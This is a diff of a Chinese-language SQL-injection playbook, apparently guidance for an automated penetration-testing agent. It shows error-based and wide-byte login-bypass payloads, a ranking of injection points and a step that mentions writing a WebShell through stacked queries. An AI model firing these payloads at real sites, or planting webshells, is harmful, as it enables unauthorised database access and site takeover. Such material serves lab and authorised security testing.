@@ -117,9 +117,11 @@ Cookie: uname=admin' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))--+
 
 ### post_form
 ```
-uname=admin' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))--+&passwd=test&submit=Submit
-uname=admin%bf' OR 1=1--+&passwd=test&submit=Submit
-login_user=admin&login_password=admin' OR 1=1--+&mysubmit=Login
+# POST表单注入：参数名从extract_forms获取，不要硬编码
+# 格式: 实际参数名=payload&其他参数=正常值&submit=Submit
+# 示例(参数名仅供参考，实际以页面为准):
+字段1=admin' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))--+&字段2=test&submit=Submit
+字段1=admin%bf' OR 1=1--+&字段2=test&submit=Submit
 ```
 
 ## Strategy
@@ -132,10 +134,11 @@ login_user=admin&login_password=admin' OR 1=1--+&mysubmit=Login
 5. 深入利用: 堆叠查询写数据/读文件/写WebShell
 
 ### 注入点优先级
-1. GET参数(id/sort/search等)
-2. POST表单(uname/passwd/login_password)
-3. HTTP头(User-Agent/Referer/Cookie) — 需要先登录成功
-4. Cookie值 — 可能有Base64编码
+1. GET查询参数 — 最常见，通过extract_forms和页面分析发现实际参数名
+2. POST表单字段 — 登录/注册/搜索页面，用extract_forms提取实际字段名
+3. HTTP头(User-Agent/Referer/Cookie) — 需要先用正确凭证登录成功后才能测试
+4. Cookie值 — 注意可能有Base64或其他编码
+5. ORDER BY参数 — 排序功能，不能用UNION，用报错或IF条件盲注
 
 ### 关键纪律
 - 参数名保持页面原始大小写
